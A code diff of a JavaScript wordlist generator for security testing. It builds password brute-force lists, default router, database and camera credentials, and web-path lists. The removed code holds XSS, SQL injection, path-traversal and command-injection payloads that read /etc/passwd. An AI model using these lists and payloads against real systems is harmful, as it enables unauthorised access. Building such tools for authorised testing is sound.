-    generatePasswords() {
-        this.showProgress('Generating password wordlist...');
-        
-        setTimeout(() => {
-            const baseWords = document.getElementById('passBase')?.value.split('\n').filter(w => w.trim()) || ['password', 'admin', 'user', 'login'];
-            const addNumbers = document.getElementById('passNumbers')?.checked || false;
-            const addYears = document.getElementById('passYears')?.checked || false;
-            const addSpecial = document.getElementById('passSpecial')?.checked || false;
-            const capitalize = document.getElementById('passCase')?.checked || false;
-            const minLen = parseInt(document.getElementById('passMinLen')?.value) || 0;
-            const maxLen = parseInt(document.getElementById('passMaxLen')?.value) || 50;
-            
-            let wordlist = [];
-            
+    
+    // Add extensions
+    if (config.extensions.length > 0) {
+        const baseWords = [...wordlist];
+        config.extensions.forEach(ext => {
             baseWords.forEach(word => {
-                word = word.trim();
-                if (!word) return;
-                
-                let variations = [word];
-                if (capitalize) {
-                    variations.push(word.charAt(0).toUpperCase() + word.slice(1));
-                    variations.push(word.toUpperCase());
-                }
-                
-                variations.forEach(variant => {
-                    if (variant.length >= minLen && variant.length <= maxLen) {
-                        wordlist.push(variant);
-                    }
-                    
-                    if (addNumbers) {
-                        for (let i = 0; i <= 999; i++) {
-                            const combo = variant + i;
-                            if (combo.length >= minLen && combo.length <= maxLen) {
-                                wordlist.push(combo);
-                            }
-                        }
-                    }
-                    
-                    if (addYears) {
-                        for (let year = 1990; year <= 2024; year++) {
-                            const combo = variant + year;
-                            if (combo.length >= minLen && combo.length <= maxLen) {
-                                wordlist.push(combo);
-                            }
-                        }
-                    }
-                    
-                    if (addSpecial) {
-                        const special = ['!', '@', '#', '$', '%', '&', '*'];
-                        special.forEach(char => {
-                            const combo = variant + char;
-                            if (combo.length >= minLen && combo.length <= maxLen) {
-                                wordlist.push(combo);
-                            }
-                        });
-                    }
-                });
+                wordlist.push(`${word}.${ext}`);
             });
-            
-            this.displayWordlist([...new Set(wordlist)], 'Brute Force Passwords');
-            this.updateStats('passwords', wordlist.length);
-            this.hideProgress();
-        }, 2000);
-    }
-
-    generateCredentials() {
-        this.showProgress('Generating credentials database...');
-        
-        setTimeout(() => {
-            const format = document.getElementById('credFormat')?.value || 'colon';
-            const includeGeneric = document.getElementById('credGeneric')?.checked || false;
-            const includeRouters = document.getElementById('credRouters')?.checked || false;
-            const includeDatabases = document.getElementById('credDatabases')?.checked || false;
-            const includeApps = document.getElementById('credApps')?.checked || false;
-            const includeIoT = document.getElementById('credIoT')?.checked || false;
-            const includeCameras = document.getElementById('credCameras')?.checked || false;
-            
-            let credentials = [];
-            
-            if (includeGeneric) {
-                credentials.push(...this.getDefaultCredentials().generic);
-            }
-            if (includeRouters) {
-                credentials.push(...this.getDefaultCredentials().routers);
-            }
-            if (includeDatabases) {
-                credentials.push(...this.getDefaultCredentials().databases);
-            }
-            if (includeApps) {
-                credentials.push(...this.getDefaultCredentials().apps);
-            }
-            if (includeIoT) {
-                credentials.push(...this.getDefaultCredentials().iot);
-            }
-            if (includeCameras) {
-                credentials.push(...this.getDefaultCredentials().cameras);
-            }
-            
-            let wordlist = [];
-            credentials.forEach(cred => {
-                switch (format) {
-                    case 'colon':
-                        wordlist.push(`${cred.username}:${cred.password}`);
-                        break;
-                    case 'space':
-                        wordlist.push(`${cred.username} ${cred.password}`);
-                        break;
-                    case 'tab':
-                        wordlist.push(`${cred.username}\t${cred.password}`);
-                        break;
-                    case 'separate':
-                        wordlist.push(cred.username, cred.password);
-                        break;
-                }
-            });
-            
-            this.displayWordlist([...new Set(wordlist)], 'Default Credentials');
-            this.updateStats('credentials', wordlist.length);
-            this.hideProgress();
-        }, 1000);
-    }
-
-    generateUsernames() {
-        this.showProgress('Generating username list...');
-        
-        setTimeout(() => {
-            const firstNames = document.getElementById('userFirst')?.value.split('\n').filter(w => w.trim()) || ['john', 'jane', 'mike', 'sarah'];
-            const lastNames = document.getElementById('userLast')?.value.split('\n').filter(w => w.trim()) || ['smith', 'doe', 'johnson', 'williams'];
-            const company = document.getElementById('userCompany')?.value.trim() || '';
-            
-            let wordlist = [];
-            
-            firstNames.forEach(first => {
-                first = first.trim().toLowerCase();
-                if (!first) return;
-                
-                lastNames.forEach(last => {
-                    last = last.trim().toLowerCase();
-                    if (!last) return;
-                    
-                    if (document.getElementById('userFirstLast')?.checked) {
-                        wordlist.push(`${first}.${last}`);
-                        wordlist.push(`${first}_${last}`);
-                        wordlist.push(`${first}${last}`);
-                    }
-                    if (document.getElementById('userFirstInitial')?.checked) {
-                        wordlist.push(`${first.charAt(0)}.${last}`);
-                        wordlist.push(`${first.charAt(0)}${last}`);
-                    }
-                    if (document.getElementById('userLastFirst')?.checked) {
-                        wordlist.push(`${last}.${first}`);
-                        wordlist.push(`${last}_${first}`);
-                        wordlist.push(`${last}${first}`);
-                    }
-                });
-                
-                if (document.getElementById('userFirstOnly')?.checked) {
-                    wordlist.push(first);
-                }
-            });
-            
-            if (company) {
-                const companyLower = company.toLowerCase();
-                wordlist.push(companyLower);
-                wordlist.push(`${companyLower}admin`);
-                wordlist.push(`admin${companyLower}`);
-                wordlist.push(`${companyLower}user`);
-                wordlist.push(`user${companyLower}`);
-            }
-            
-            this.displayWordlist([...new Set(wordlist)], 'Username List');
-            this.updateStats('usernames', wordlist.length);
-            this.hideProgress();
-        }, 1000);
-    }
-
-    generatePatterns() {
-        this.showProgress('Generating pattern-based wordlist...');
-        
-        setTimeout(() => {
-            const template = document.getElementById('patternTemplate')?.value || '?w?d?d?d';
-            const words = document.getElementById('patternWords')?.value.split('\n').filter(w => w.trim()) || ['admin', 'test', 'user', 'pass'];
-            const specialChars = document.getElementById('patternSpecial')?.value || '!@#$%^&*';
-            const doReverse = document.getElementById('patternReverse')?.checked || false;
-            const doCase = document.getElementById('patternCase')?.checked || false;
-            const doLeet = document.getElementById('patternLeet')?.checked || false;
-            
-            let wordlist = [];
-            
-            words.forEach(word => {
-                word = word.trim();
-                if (!word) return;
-                
-                let wordVariations = [word];
-                if (doReverse) wordVariations.push(word.split('').reverse().join(''));
-                if (doCase) {
-                    wordVariations.push(word.toUpperCase());
-                    wordVariations.push(word.toLowerCase());
-                    wordVariations.push(word.charAt(0).toUpperCase() + word.slice(1));
-                }
-                if (doLeet) {
-                    const leetWord = word.replace(/a/gi, '@').replace(/e/gi, '3').replace(/i/gi, '1').replace(/o/gi, '0').replace(/s/gi, '$');
-                    wordVariations.push(leetWord);
-                }
-                
-                wordVariations.forEach(wordVar => {
-                    // Generate pattern instances
-                    for (let i = 0; i < 10; i++) {
-                        let result = template.replace(/\?w/g, wordVar);
-                        result = result.replace(/\?d/g, () => Math.floor(Math.random() * 10));
-                        result = result.replace(/\?l/g, () => String.fromCharCode(97 + Math.floor(Math.random() * 26)));
-                        result = result.replace(/\?u/g, () => String.fromCharCode(65 + Math.floor(Math.random() * 26)));
-                        result = result.replace(/\?s/g, () => specialChars[Math.floor(Math.random() * specialChars.length)]);
-                        
-                        wordlist.push(result);
-                    }
-                });
-            });
-            
-            this.displayWordlist([...new Set(wordlist)], 'Custom Patterns');
-            this.updateStats('patterns', wordlist.length);
-            this.hideProgress();
-        }, 1500);
-    }
-
-    generateHybrid() {
-        this.showProgress('Generating hybrid wordlist...');
-        
-        setTimeout(() => {
-            const primary = document.getElementById('hybridPrimary')?.value.split('\n').filter(w => w.trim()) || ['password', 'admin', 'user'];
-            const secondary = document.getElementById('hybridSecondary')?.value.split('\n').filter(w => w.trim()) || ['123', '2024', '!@#'];
-            const doAppend = document.getElementById('hybridAppend')?.checked || false;
-            const doPrepend = document.getElementById('hybridPrepend')?.checked || false;
-            const doInsert = document.getElementById('hybridInsert')?.checked || false;
-            const doToggleCase = document.getElementById('hybridToggleCase')?.checked || false;
-            
-            let wordlist = [];
-            
-            primary.forEach(p => {
-                p = p.trim();
-                if (!p) return;
-                
-                secondary.forEach(s => {
-                    s = s.trim();
-                    if (!s) return;
-                    
-                    let combinations = [];
-                    
-                    if (doAppend) {
-                        combinations.push(p + s);
-                    }
-                    if (doPrepend) {
-                        combinations.push(s + p);
-                    }
-                    if (doInsert) {
-                        const mid = Math.floor(p.length / 2);
-                        combinations.push(p.slice(0, mid) + s + p.slice(mid));
-                    }
-                    
-                    combinations.forEach(combo => {
-                        wordlist.push(combo);
-                        if (doToggleCase) {
-                            wordlist.push(combo.toUpperCase());
-                            wordlist.push(combo.toLowerCase());
-                            wordlist.push(combo.charAt(0).toUpperCase() + combo.slice(1));
-                        }
-                    });
-                });
-            });
-            
-            this.displayWordlist([...new Set(wordlist)], 'Hybrid Combinations');
-            this.updateStats('hybrid', wordlist.length);
-            this.hideProgress();
-        }, 1500);
-    }
-
-    generateEndpoints() {
-        this.showProgress('Generating API endpoints...');
-        
-        setTimeout(() => {
-            const apiType = document.getElementById('apiType')?.value || 'rest';
-            const versions = document.getElementById('apiVersion')?.value.split(',').map(v => v.trim()) || ['v1'];
-            const includeAuth = document.getElementById('apiAuth')?.checked || false;
-            const includeUsers = document.getElementById('apiUsers')?.checked || false;
-            const includeAdmin = document.getElementById('apiAdmin')?.checked || false;
-            const includeFiles = document.getElementById('apiFiles')?.checked || false;
-            const includeData = document.getElementById('apiData')?.checked || false;
-            
-            let wordlist = [];
-            
-            versions.forEach(version => {
-                if (includeAuth) {
-                    wordlist.push(...this.getAuthEndpoints(apiType, version));
-                }
-                if (includeUsers) {
-                    wordlist.push(...this.getUserEndpoints(apiType, version));
-                }
-                if (includeAdmin) {
-                    wordlist.push(...this.getAdminEndpoints(apiType, version));
-                }
-                if (includeFiles) {
-                    wordlist.push(...this.getFileEndpoints(apiType, version));
-                }
-                if (includeData) {
-                    wordlist.push(...this.getDataEndpoints(apiType, version));
-                }
-            });
-            
-            if (apiType === 'graphql') {
-                wordlist.push('/graphql', '/graphiql', '/graphql/playground', '/graphql/voyager');
-            }
-            
-            this.displayWordlist([...new Set(wordlist)], 'API Endpoints');
-            this.updateStats('endpoints', wordlist.length);
-            this.hideProgress();
-        }, 1000);
-    }
-
-    generateWebtech() {
-        this.showProgress('Generating web technology paths...');
-        
-        setTimeout(() => {
-            let wordlist = [];
-            
-            if (document.getElementById('techWordPress')?.checked) {
-                wordlist.push(...this.getWordPressPaths());
-            }
-            if (document.getElementById('techDrupal')?.checked) {
-                wordlist.push(...this.getDrupalPaths());
-            }
-            if (document.getElementById('techJoomla')?.checked) {
-                wordlist.push(...this.getJoomlaPaths());
-            }
-            if (document.getElementById('techLaravel')?.checked) {
-                wordlist.push(...this.getLaravelPaths());
-            }
-            if (document.getElementById('techSymfony')?.checked) {
-                wordlist.push(...this.getSymfonyPaths());
-            }
-            if (document.getElementById('techSpring')?.checked) {
-                wordlist.push(...this.getSpringPaths());
-            }
-            
-            this.displayWordlist([...new Set(wordlist)], 'Web Technology Paths');
-            this.updateStats('webtech', wordlist.length);
-            this.hideProgress();
-        }, 1500);
-    }
-
-    generateSecurity() {
-        this.showProgress('Generating security test payloads...');
-        
-        setTimeout(() => {
-            let wordlist = [];
-            
-            if (document.getElementById('secXSS')?.checked) {
-                wordlist.push(...this.getXSSPayloads());
-            }
-            if (document.getElementById('secSQLi')?.checked) {
-                wordlist.push(...this.getSQLiPayloads());
-            }
-            if (document.getElementById('secLFI')?.checked) {
-                wordlist.push(...this.getLFIPayloads());
-            }
-            if (document.getElementById('secCMDi')?.checked) {
-                wordlist.push(...this.getCMDiPayloads());
-            }
-            if (document.getElementById('secFuzz')?.checked) {
-                wordlist.push(...this.getFuzzPayloads());
-            }
-            if (document.getElementById('secBypass')?.checked) {
-                wordlist.push(...this.getBypassPayloads());
-            }
-            
-            // Apply encoding if requested
-            let encodedWordlist = [...wordlist];
-            if (document.getElementById('encURL')?.checked) {
-                encodedWordlist.push(...wordlist.map(payload => encodeURIComponent(payload)));
-            }
-            if (document.getElementById('encHTML')?.checked) {
-                encodedWordlist.push(...wordlist.map(payload => 
-                    payload.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#x27;')
-                ));
-            }
-            if (document.getElementById('encUnicode')?.checked) {
-                encodedWordlist.push(...wordlist.map(payload => 
-                    payload.split('').map(char => '\\u' + char.charCodeAt(0).toString(16).padStart(4, '0')).join('')
-                ));
-            }
-            
-            this.displayWordlist([...new Set(encodedWordlist)], 'Security Test Payloads');
-            this.updateStats('security', encodedWordlist.length);
-            this.hideProgress();
-        }, 2000);
-    }
-
-    // Data source methods
-    getDirectoryWords(tech) {
-        const base = ['admin', 'backup', 'config', 'uploads', 'images', 'scripts', 'styles', 'data', 'files', 'docs', 'downloads', 'temp', 'cache', 'logs', 'debug', 'test', 'dev', 'api', 'assets', 'media', 'content', 'static', 'public', 'private', 'secure', 'hidden'];
-        
-        const techSpecific = {
-            php: ['includes', 'lib', 'vendor', 'composer'],
-            asp: ['bin', 'App_Data', 'App_Code', 'App_GlobalResources'],
-            java: ['WEB-INF', 'META-INF', 'classes', 'lib'],
-            python: ['static', 'templates', 'migrations', '__pycache__'],
-            nodejs: ['node_modules', 'public', 'views', 'routes']
-        };
-        
-        return [...base, ...(techSpecific[tech] || [])];
-    }
-
-    getFileWords(tech) {
-        const base = ['index', 'admin', 'login', 'config', 'main', 'app', 'test', 'info', 'status', 'health', 'robots.txt', 'sitemap.xml', '.htaccess'];
-        
-        const techSpecific = {
-            php: ['index.php', 'config.php', 'admin.php', 'login.php', 'info.php', 'phpinfo.php', 'wp-config.php'],
-            asp: ['default.aspx', 'web.config', 'admin.aspx', 'login.aspx', 'global.asax'],
-            java: ['index.jsp', 'admin.jsp', 'web.xml', 'struts.xml', 'applicationContext.xml'],
-            python: ['app.py', 'main.py', 'config.py', 'settings.py', 'manage.py', 'wsgi.py', 'requirements.txt'],
-            nodejs: ['package.json', 'server.js', 'app.js', 'index.js', 'gulpfile.js', 'webpack.config.js']
-        };
-        
-        return [...base, ...(techSpecific[tech] || [])];
-    }
-
-    getBackupWords() {
-        return ['backup', 'bak', 'old', 'orig', 'copy', 'save', 'tmp', 'temp', 'backup.zip', 'backup.tar.gz', 'backup.sql', 'dump.sql', 'backup.bak', 'site_backup.zip', 'db_backup.sql'];
-    }
-
-    getConfigWords(tech) {
-        const base = ['config', 'configuration', 'settings', 'options', 'preferences', '.env', 'environment'];
-        
-        const techSpecific = {
-            php: ['wp-config.php', 'config.inc.php', 'configuration.php', 'config.ini'],
-            asp: ['web.config', 'app.config', 'machine.config', 'appsettings.json'],
-            java: ['application.properties', 'config.properties', 'hibernate.cfg.xml', 'spring.xml'],
-            python: ['settings.py', 'config.py', 'local_settings.py', 'production.py', 'development.py'],
-            nodejs: ['config.json', '.env', 'package.json', '.npmrc', 'ecosystem.config.js']
-        };
-        
-        return [...base, ...(techSpecific[tech] || [])];
-    }
-
-    getDefaultCredentials() {
-        return {
-            generic: [
-                { username: 'admin', password: 'admin' },
-                { username: 'admin', password: 'password' },
-                { username: 'admin', password: '123456' },
-                { username: 'root', password: 'root' },
-                { username: 'user', password: 'user' },
-                { username: 'test', password: 'test' },
-                { username: 'guest', password: 'guest' },
-                { username: 'administrator', password: 'administrator' },
-                { username: 'admin', password: '' },
-                { username: 'root', password: 'toor' }
-            ],
-            routers: [
-                { username: 'admin', password: 'admin' },
-                { username: 'admin', password: 'password' },
-                { username: 'admin', password: '' },
-                { username: 'root', password: 'root' },
-                { username: 'cisco', password: 'cisco' },
-                { username: 'netgear', password: 'password' },
-                { username: 'linksys', password: 'admin' }
-            ],
-            databases: [
-                { username: 'root', password: '' },
-                { username: 'root', password: 'root' },
-                { username: 'mysql', password: 'mysql' },
-                { username: 'postgres', password: 'postgres' },
-                { username: 'sa', password: 'sa' },
-                { username: 'oracle', password: 'oracle' },
-                { username: 'admin', password: 'admin' }
-            ],
-            apps: [
-                { username: 'admin', password: 'admin' },
-                { username: 'admin', password: 'password' },
-                { username: 'administrator', password: 'password' },
-                { username: 'demo', password: 'demo' },
-                { username: 'test', password: 'test' },
-                { username: 'guest', password: 'guest' }
-            ],
-            iot: [
-                { username: 'admin', password: 'admin' },
-                { username: 'admin', password: '' },
-                { username: 'root', password: 'root' },
-                { username: 'pi', password: 'raspberry' },
-                { username: 'ubuntu', password: 'ubuntu' },
-                { username: 'user', password: 'user' }
-            ],
-            cameras: [
-                { username: 'admin', password: 'admin' },
-                { username: 'admin', password: '' },
-                { username: 'admin', password: '123456' },
-                { username: 'root', password: 'root' },
-                { username: 'viewer', password: 'viewer' },
-                { username: 'camera', password: 'camera' }
-            ]
-        };
-    }
-
-    getAuthEndpoints(apiType, version) {
-        const base = [
-            `/api/${version}/auth/login`,
-            `/api/${version}/auth/logout`,
-            `/api/${version}/auth/register`,
-            `/api/${version}/auth/refresh`,
-            `/api/${version}/auth/reset`,
-            `/api/${version}/auth/verify`,
-            `/api/${version}/login`,
-            `/api/${version}/logout`,
-            `/api/${version}/register`,
-            `/api/${version}/token`
-        ];
-        
-        if (apiType === 'rest') {
-            base.push(`/api/${version}/oauth/token`, `/api/${version}/oauth/authorize`);
-        }
-        
-        return base;
-    }
-
-    getUserEndpoints(apiType, version) {
-        return [
-            `/api/${version}/users`,
-            `/api/${version}/users/profile`,
-            `/api/${version}/users/me`,
-            `/api/${version}/users/settings`,
-            `/api/${version}/user`,
-            `/api/${version}/profile`,
-            `/api/${version}/account`,
-            `/api/${version}/me`
-        ];
-    }
-
-    getAdminEndpoints(apiType, version) {
-        return [
-            `/api/${version}/admin`,
-            `/api/${version}/admin/users`,
-            `/api/${version}/admin/config`,
-            `/api/${version}/admin/settings`,
-            `/api/${version}/admin/logs`,
-            `/api/${version}/admin/stats`,
-            `/api/${version}/admin/dashboard`,
-            `/api/${version}/management`,
-            `/api/${version}/control`
-        ];
-    }
-
-    getFileEndpoints(apiType, version) {
-        return [
-            `/api/${version}/files`,
-            `/api/${version}/files/upload`,
-            `/api/${version}/files/download`,
-            `/api/${version}/upload`,
-            `/api/${version}/download`,
-            `/api/${version}/media`,
-            `/api/${version}/attachments`,
-            `/api/${version}/documents`
-        ];
-    }
-
-    getDataEndpoints(apiType, version) {
-        return [
-            `/api/${version}/data`,
-            `/api/${version}/data/export`,
-            `/api/${version}/data/import`,
-            `/api/${version}/export`,
-            `/api/${version}/import`,
-            `/api/${version}/backup`,
-            `/api/${version}/restore`,
-            `/api/${version}/sync`
-        ];
-    }
-
-    getWordPressPaths() {
-        return [
-            '/wp-admin/',
-            '/wp-content/',
-            '/wp-includes/',
-            '/wp-config.php',
-            '/wp-login.php',
-            '/wp-admin/admin-ajax.php',
-            '/xmlrpc.php',
-            '/readme.html',
-            '/wp-content/uploads/',
-            '/wp-content/themes/',
-            '/wp-content/plugins/',
-            '/wp-admin/install.php',
-            '/wp-admin/upgrade.php',
-            '/wp-trackback.php',
-            '/wp-comments-post.php'
-        ];
-    }
-
-    getDrupalPaths() {
-        return [
-            '/admin/',
-            '/user/login',
-            '/user/register',
-            '/sites/default/',
-            '/sites/all/',
-            '/modules/',
-            '/themes/',
-            '/core/',
-            '/CHANGELOG.txt',
-            '/INSTALL.txt',
-            '/LICENSE.txt',
-            '/README.txt',
-            '/cron.php',
-            '/update.php',
-            '/install.php'
-        ];
-    }
-
-    getJoomlaPaths() {
-        return [
-            '/administrator/',
-            '/components/',
-            '/modules/',
-            '/plugins/',
-            '/templates/',
-            '/libraries/',
-            '/configuration.php',
-            '/index.php',
-            '/htaccess.txt',
-            '/web.config.txt',
-            '/LICENSE.txt',
-            '/README.txt'
-        ];
-    }
-
-    getLaravelPaths() {
-        return [
-            '/storage/',
-            '/bootstrap/',
-            '/vendor/',
-            '/config/',
-            '/database/',
-            '/public/',
-            '/resources/',
-            '/routes/',
-            '/app/',
-            '/.env',
-            '/artisan',
-            '/composer.json',
-            '/composer.lock',
-            '/package.json'
-        ];
-    }
-
-    getSymfonyPaths() {
-        return [
-            '/config/',
-            '/public/',
-            '/src/',
-            '/templates/',
-            '/var/',
-            '/vendor/',
-            '/bin/',
-            '/.env',
-            '/composer.json',
-            '/composer.lock',
-            '/symfony.lock'
-        ];
-    }
-
-    getSpringPaths() {
-        return [
-            '/WEB-INF/',
-            '/META-INF/',
-            '/classes/',
-            '/lib/',
-            '/static/',
-            '/templates/',
-            '/application.properties',
-            '/application.yml',
-            '/pom.xml',
-            '/build.gradle'
-        ];
-    }
-
-    getXSSPayloads() {
-        return [
-            '<script>alert("XSS")</script>',
-            '<img src=x onerror=alert("XSS")>',
-            '<svg onload=alert("XSS")>',
-            'javascript:alert("XSS")',
-            '"><script>alert("XSS")</script>',
-            '\';alert("XSS");//',
-            '<iframe src="javascript:alert(\'XSS\')">',
-            '<body onload=alert("XSS")>',
-            '<div onmouseover="alert(\'XSS\')">test</div>',
-            '<script>console.log("XSS")</script>'
-        ];
-    }
-
-    getSQLiPayloads() {
-        return [
-            "' OR '1'='1",
-            '" OR "1"="1',
-            "'; DROP TABLE users; --",
-            "' UNION SELECT NULL--",
-            "admin'--",
-            "' OR 1=1#",
-            "' OR 'a'='a",
-            '" OR 1=1--',
-            "' UNION SELECT username, password FROM users--",
-            "1' OR '1'='1' /*"
-        ];
-    }
-
-    getLFIPayloads() {
-        return [
-            '../../../etc/passwd',
-            '../../../windows/system32/drivers/etc/hosts',
-            '....//....//....//etc/passwd',
-            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
-            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
-            '/etc/passwd',
-            '/proc/self/environ',
-            '/var/log/apache2/access.log',
-            'C:\\windows\\system32\\drivers\\etc\\hosts'
-        ];
-    }
-
-    getCMDiPayloads() {
-        return [
-            '; cat /etc/passwd',
-            '| cat /etc/passwd',
-            '& cat /etc/passwd',
-            '&& cat /etc/passwd',
-            '|| cat /etc/passwd',
-            '`cat /etc/passwd`',
-            '$(cat /etc/passwd)',
-            '; ls -la',
-            '| whoami',
-            '& id'
-        ];
-    }
-
-    getFuzzPayloads() {
-        return [
-            'A'.repeat(100),
-            'A'.repeat(1000),
-            'A'.repeat(10000),
-            '0'.repeat(100),
-            '%s%s%s%s%s%s%s%s%s%s',
-            '%x%x%x%x%x%x%x%x%x%x',
-            '../' * 100,
-            '\\' * 100,
-            '/' * 100,
-            '%00' * 100
-        ];
-    }
-
-    getBypassPayloads() {
-        return [
-            'admin\' --',
-            'admin\' #',
-            'admin\'/*',
-            'admin\' or \'1\'=\'1\' --',
-            'admin\' or \'1\'=\'1\' #',
-            'admin\' or \'1\'=\'1\'/*',
-            '\' or 1=1 --',
-            '\' or 1=1 #',
-            '\' or 1=1/*',
-            'admin\') --',
-            'admin\') #'
-        ];
-    }
-
-    // UI Methods
-    displayWordlist(wordlist, title) {
-        const outputPanel = document.getElementById('outputPanel');
-        const outputContent = document.getElementById('outputContent');
-        const outputCount = document.getElementById('outputCount');
-        const outputSize = document.getElementById('outputSize');
-        const outputUnique = document.getElementById('outputUnique');
-        const outputAvgLength = document.getElementById('outputAvgLength');
-        
-        if (!outputPanel || !outputContent) return;
-        
-        // Remove duplicates
-        const uniqueWordlist = [...new Set(wordlist)];
-        
-        // Calculate stats
-        const content = uniqueWordlist.join('\n');
-        const sizeBytes = new Blob([content]).size;
-        const avgLength = uniqueWordlist.length > 0 ? uniqueWordlist.reduce((sum, word) => sum + word.length, 0) / uniqueWordlist.length : 0;
-        
-        // Update display
-        outputContent.value = content;
-        if (outputCount) outputCount.textContent = uniqueWordlist.length.toLocaleString();
-        if (outputSize) outputSize.textContent = this.formatBytes(sizeBytes);
-        if (outputUnique) outputUnique.textContent = uniqueWordlist.length.toLocaleString();
-        if (outputAvgLength) outputAvgLength.textContent = avgLength.toFixed(1);
-        
-        // Store for download
-        this.currentWordlist = {
-            content: content,
-            title: title,
-            count: uniqueWordlist.length
-        };
-        
-        // Show panel
-        outputPanel.classList.add('active');
-        
-        // Add to history
-        this.addToHistory(title, uniqueWordlist.length, sizeBytes);
-    }
-
-    showProgress(message) {
-        const indicator = document.getElementById('progressIndicator');
-        const text = document.getElementById('progressText');
-        const fill = document.getElementById('progressFill');
-        
-        if (!indicator || !text || !fill) return;
-        
-        text.textContent = message;
-        indicator.classList.add('active');
-        
-        let progress = 0;
-        const interval = setInterval(() => {
-            progress += Math.random() * 30;
-            if (progress > 90) progress = 90;
-            fill.style.width = progress + '%';
-        }, 100);
-        
-        this.progressInterval = interval;
-    }
-
-    hideProgress() {
-        const indicator = document.getElementById('progressIndicator');
-        const fill = document.getElementById('progressFill');
-        
-        if (!indicator || !fill) return;
-        
-        fill.style.width = '100%';
-        setTimeout(() => {
-            indicator.classList.remove('active');
-            fill.style.width = '0%';
-            if (this.progressInterval) {
-                clearInterval(this.progressInterval);
-                this.progressInterval = null;
-            }
-        }, 500);
-    }
-
-    setupOutputPanel() {
-        const copyBtn = document.getElementById('copyOutput');
-        const downloadBtn = document.getElementById('downloadOutput');
-        const closeBtn = document.getElementById('closeOutput');
-        
-        if (copyBtn) {
-            copyBtn.addEventListener('click', () => {
-                if (this.currentWordlist) {
-                    navigator.clipboard.writeText(this.currentWordlist.content).then(() => {
-                        this.showToast('Success', 'Wordlist copied to clipboard!', 'success');
-                    }).catch(() => {
-                        this.showToast('Error', 'Failed to copy to clipboard', 'error');
-                    });
-                }
-            });
-        }
-
-        if (downloadBtn) {
-            downloadBtn.addEventListener('click', () => {
-                if (this.currentWordlist) {
-                    this.downloadWordlist(this.currentWordlist.content, this.currentWordlist.title);
-                }
-            });
-        }
-
-        if (closeBtn) {
-            closeBtn.addEventListener('click', () => {
-                document.getElementById('outputPanel').classList.remove('active');
-            });
-        }
-    }
-
-    downloadWordlist(content, title) {
-        const blob = new Blob([content], { type: 'text/plain' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `${title.replace(/[^a-z0-9]/gi, '_').toLowerCase()}_${Date.now()}.txt`;
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        URL.revokeObjectURL(url);
-        
-        this.stats.totalDownloads++;
-        this.updateStatsDisplay();
-        this.showToast('Success', 'Wordlist downloaded successfully!', 'success');
-    }
-
-    setupFileUpload() {
-        const uploadArea = document.getElementById('uploadArea');
-        const fileInput = document.getElementById('fileInput');
-        
-        if (!uploadArea || !fileInput) return;
-        
-        uploadArea.addEventListener('click', () => fileInput.click());
-        
-        uploadArea.addEventListener('dragover', (e) => {
-            e.preventDefault();
-            uploadArea.classList.add('dragover');
-        });
-        
-        uploadArea.addEventListener('dragleave', () => {
-            uploadArea.classList.remove('dragover');
-        });
-        
-        uploadArea.addEventListener('drop', (e) => {
-            e.preventDefault();
-            uploadArea.classList.remove('dragover');
-            this.handleFiles(e.dataTransfer.files);
-        });
-        
-        fileInput.addEventListener('change', (e) => {
-            this.handleFiles(e.target.files);
         });
     }
+    
+    // Add custom paths
+    wordlist.push(...config.custom);
+    
+    displayResults(wordlist, 'Web Discovery Enumeration');
+}
 
-    handleFiles(files) {
-        Array.from(files).forEach(file => {
-            if (file.type === 'text/plain' || file.name.endsWith('.txt')) {
-                const reader = new FileReader();
-                reader.onload = (e) => {
-                    this.analyzeWordlist(e.target.result, file.name);
-                };
-                reader.readAsText(file);
-            } else {
-                this.showToast('Error', 'Please upload only text files (.txt)', 'error');
+function generateBruteForce() {
+    const config = {
+        common: document.getElementById('bf-common').checked,
+        numeric: document.getElementById('bf-numeric').checked,
+        keyboard: document.getElementById('bf-keyboard').checked,
+        dates: document.getElementById('bf-dates').checked,
+        minLength: parseInt(document.getElementById('bf-min').value),
+        maxLength: parseInt(document.getElementById('bf-max').value),
+        lowercase: document.getElementById('bf-lowercase').checked,
+        uppercase: document.getElementById('bf-uppercase').checked,
+        numbers: document.getElementById('bf-numbers').checked,
+        special: document.getElementById('bf-special').checked
+    };
+    
+    let wordlist = [];
+    
+    if (config.common) {
+        wordlist.push(...getCommonPasswords());
+    }
+    
+    if (config.numeric) {
+        wordlist.push(...generateNumericPatterns(config.minLength, config.maxLength));
+    }
+    
+    if (config.keyboard) {
+        wordlist.push(...getKeyboardPatterns());
+    }
+    
+    if (config.dates) {
+        wordlist.push(...generateDatePatterns());
+    }
+    
+    // Generate character combinations
+    if (config.lowercase || config.uppercase || config.numbers || config.special) {
+        wordlist.push(...generateCharacterCombinations(config));
+    }
+    
+    displayResults(wordlist, 'Password Brute Force');
+}
+
+function generateCredentials() {
+    const config = {
+        routers: document.getElementById('cred-routers').checked,
+        databases: document.getElementById('cred-databases').checked,
+        web: document.getElementById('cred-web').checked,
+        os: document.getElementById('cred-os').checked,
+        format: document.getElementById('cred-format').value,
+        vendor: document.getElementById('cred-vendor').value.toLowerCase().trim()
+    };
+    
+    let credentials = [];
+    
+    if (config.routers) {
+        credentials.push(...getRouterCredentials());
+    }
+    
+    if (config.databases) {
+        credentials.push(...getDatabaseCredentials());
+    }
+    
+    if (config.web) {
+        credentials.push(...getWebCredentials());
+    }
+    
+    if (config.os) {
+        credentials.push(...getOSCredentials());
+    }
+    
+    // Filter by vendor if specified
+    if (config.vendor) {
+        credentials = credentials.filter(cred => 
+            cred.vendor && cred.vendor.toLowerCase().includes(config.vendor)
+        );
+    }
+    
+    // Format output
+    const wordlist = credentials.map(cred => {
+        switch(config.format) {
+            case 'user:pass':
+                return `${cred.username}:${cred.password}`;
+            case 'user pass':
+                return `${cred.username} ${cred.password}`;
+            case 'user/pass':
+                return `${cred.username}/${cred.password}`;
+            case 'json':
+                return JSON.stringify(cred);
+            default:
+                return `${cred.username}:${cred.password}`;
+        }
+    });
+    
+    displayResults(wordlist, 'Default Credentials');
+}
+
+function generateUsernames() {
+    const config = {
+        names: document.getElementById('user-names').value.split('\n').filter(name => name.trim()),
+        firstname: document.getElementById('user-firstname').checked,
+        lastname: document.getElementById('user-lastname').checked,
